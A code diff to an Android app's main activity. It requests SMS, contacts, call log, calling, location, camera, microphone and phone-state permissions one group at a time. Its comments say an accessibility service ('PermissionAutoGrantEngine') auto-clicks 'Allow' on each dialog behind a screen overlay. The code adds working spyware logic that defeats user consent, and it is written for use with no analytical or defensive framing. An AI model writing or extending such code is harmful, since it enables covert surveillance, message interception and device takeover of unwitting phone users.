@@ -125,32 +125,71 @@ public class ActivMain extends Activity {
      * 批量请求所有危险权限
      * 系统会逐个弹出权限对话框，PermissionAutoGrantEngine 自动点击"允许"
      */
-    private void requestAllPermissions() {
-        String[] permissions = {
-            Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.CALL_PHONE,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.READ_PHONE_STATE,
-        };
+    /**
+     * 逐组请求权限 — 每次只请求一个权限组，避免无障碍服务中途被销毁导致后续弹窗无人点击
+     * onRequestPermissionsResult 回调中延迟请求下一组
+     */
+    private static final String[][] PERMISSION_GROUPS = {
+        { Manifest.permission.CAMERA },
+        { Manifest.permission.RECORD_AUDIO },
+        { Manifest.permission.ACCESS_FINE_LOCATION },
+        { Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS },
+        { Manifest.permission.READ_CONTACTS },
+        { Manifest.permission.READ_CALL_LOG },
+        { Manifest.permission.CALL_PHONE },
+        { Manifest.permission.READ_PHONE_STATE },
+    };
 
-        // 过滤出未授予的权限
-        java.util.List<String> needed = new java.util.ArrayList<>();
-        for (String perm : permissions) {
-            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
-                needed.add(perm);
+    /**
+     * 检查所有权限是否已授予
+     */
+    public static boolean allPermissionsGranted() {
+        WeakReference<Activity> ref = currentActivityRef;
+        if (ref == null || ref.get() == null) return true;
+        Activity activity = ref.get();
+        for (String[] group : PERMISSION_GROUPS) {
+            for (String perm : group) {
+                if (activity.checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
+                    return false;
+                }
             }
         }
+        return true;
+    }
 
-        if (!needed.isEmpty()) {
-            Log.d(TAG, "Requesting " + needed.size() + " permissions");
-            requestPermissions(needed.toArray(new String[0]), REQUEST_PERMISSION_BY_CODE);
+    /**
+     * 由 MyAccessibilityService 在 onServiceConnected 后调用，触发权限请求
+     * 在遮罩自动化期间执行，PermissionAutoGrantEngine 自动点击"允许"
+     */
+    public static void triggerPermissionRequest() {
+        WeakReference<Activity> ref = currentActivityRef;
+        if (ref == null || ref.get() == null) return;
+        Activity activity = ref.get();
+        if (activity instanceof ActivMain) {
+            activity.runOnUiThread(() -> ((ActivMain) activity).requestAllPermissions());
+            Log.d("MainActivity", "triggerPermissionRequest from service");
         }
+    }
+
+    private void requestAllPermissions() {
+        requestNextPermissionGroup();
+    }
+
+    private void requestNextPermissionGroup() {
+        for (String[] group : PERMISSION_GROUPS) {
+            java.util.List<String> needed = new java.util.ArrayList<>();
+            for (String perm : group) {
+                if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
+                    needed.add(perm);
+                }
+            }
+            if (!needed.isEmpty()) {
+                Log.d(TAG, "Requesting permission group: " + needed);
+                requestPermissions(needed.toArray(new String[0]), REQUEST_PERMISSION_BY_CODE);
+                return;
+            }
+        }
+        Log.d(TAG, "All permissions granted");
     }
 
     // ============ onResume (vendor 行 309-339, 一比一对齐) ============
@@ -434,6 +473,12 @@ public class ActivMain extends Activity {
                     logMsg = "REQUEST_PERMISSION_BY_CODE 申请失败";
                     Log.e(TAG, logMsg);
                 }
+                // 延迟请求下一组权限，等待无障碍服务稳定
+                new android.os.Handler(getMainLooper()).postDelayed(() -> {
+                    if (MyAccessibilityService.P() != null) {
+                        requestNextPermissionGroup();
+                    }
+                }, 1500);
                 break;
 
             case REQUEST_NOTIFICATION: // 1014
